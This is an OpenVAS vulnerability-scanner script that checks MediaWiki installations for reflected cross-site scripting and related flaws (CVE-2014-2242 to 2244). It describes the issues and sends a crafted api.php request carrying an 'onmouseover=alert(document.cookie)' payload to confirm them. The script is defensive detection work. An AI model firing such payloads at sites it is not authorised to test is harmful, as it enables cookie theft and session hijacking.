###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_mediawiki_mult_vuln01_mar14.nasl 6724 2017-07-14 09:57:17Z teissa $
#
# Mediawiki Multiple Vulnerabilities-01 Mar14
#
# Authors:
# Shakeel <bshakeel@secpod.com>
#
# Copyright:
# Copyright (C) 2014 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.804321";
CPE = "cpe:/a:mediawiki:mediawiki";

if (description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 6724 $");
  script_cve_id("CVE-2014-2242", "CVE-2014-2243", "CVE-2014-2244");
  script_bugtraq_id(65910, 65883, 65906);
  script_tag(name:"cvss_base", value:"5.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2017-07-14 11:57:17 +0200 (Fri, 14 Jul 2017) $");
  script_tag(name:"creation_date", value:"2014-03-04 10:37:52 +0530 (Tue, 04 Mar 2014)");
  script_name("Mediawiki Multiple Vulnerabilities-01 Mar14");

  tag_summary =
"The host is installed with MediaWiki and is prone to multiple vulnerabilities.";

  tag_vuldetect =
"Send a crafted data via HTTP GET request and check whether it is possible
to read the cookie or not.";

  tag_insight =
"The multiple flaws are due to an,
 - Input passed via 'text' parameter to 'api.php' is not properly sanitised
   before being returned to the user.
 - Input to 'includes/upload/UploadBase.php' script is not properly sanitised
   during the uploading of an SVG namespace.
 - Error in 'includes/User.php' script in 'theloadFromSession' function.";

  tag_impact =
"Successful exploitation will allow attacker to execute arbitrary HTML and
script code in a user's browser session in the context of an affected site
and attacker can gain sensitive information.

Impact Level: Application";

  tag_affected =
"Mediawiki version 1.19.x before 1.19.12, 1.20.x, 1.21.x
before 1.21.6 and 1.22.x before 1.22.3";

  tag_solution =
"Upgrade to MediaWiki 1.19.12 or 1.21.6 or 1.22.3 or later.
For updates refer to http://www.mediawiki.org/wiki/MediaWiki";


  script_tag(name : "summary" , value : tag_summary);
  script_tag(name : "vuldetect" , value : tag_vuldetect);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "solution" , value : tag_solution);

  script_xref(name : "URL" , value : "http://secunia.com/advisories/57184/");
  script_xref(name : "URL" , value : "http://openwall.com/lists/oss-security/2014/03/01/2");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_mediawiki_detect.nasl");
  script_mandatory_keys("mediawiki/installed");
  script_require_ports("Services/www", 80);
  exit(0);
}


include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

## Variable Initialization
mwPort = "";
url = "";
dir = "";

## Get MediaWiki Port
if(!mwPort = get_app_port(cpe:CPE, nvt:SCRIPT_OID)){
  exit(0);
}

## Get MediaWiki Location
if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:mwPort)){
  exit(0);
}

## Construct the Attack Request
url= dir + "/api.php?action=parse&text=api.php?http://onmouseover=alert%28" +
        "document.cookie%29//&title=Foo&prop=wikitext&format=jsonfm";

## Try attack and check the response to confirm vulnerability.
if(http_vuln_check(port:mwPort, url:url, check_header:TRUE,
   pattern:">http.*onmouseover=alert\(document.cookie\)",
   extra_check:make_list(">MediaWiki API")))
{
  security_message(mwPort);
  exit(0);
}
